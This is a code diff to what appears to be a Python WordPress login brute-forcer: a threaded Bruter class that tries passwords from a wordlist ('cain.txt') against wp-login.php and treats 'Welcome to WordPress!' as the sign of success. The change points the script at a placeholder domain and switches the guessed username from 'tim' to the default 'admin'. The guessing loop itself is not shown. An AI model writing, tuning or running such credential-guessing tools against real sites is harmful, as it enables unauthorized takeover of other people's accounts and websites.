@@ -8,9 +8,9 @@ import threading
 import time
 
 SUCCESS = 'Welcome to WordPress!'
-TARGET = "http://boodelyboo.com/wordpress/wp-login.php"
+TARGET = "http://test_test_test.com/wp-login.php"
 WORDLIST = 'cain.txt'
-
+ADMIN = "admin"
 
 def get_words():
     with open(WORDLIST) as f:
@@ -68,6 +68,6 @@ class Bruter:
 
 
 if __name__ == '__main__':
-    b = Bruter('tim', TARGET)
+    b = Bruter(ADMIN, TARGET)
     words = get_words()
     b.run_bruteforce(words)
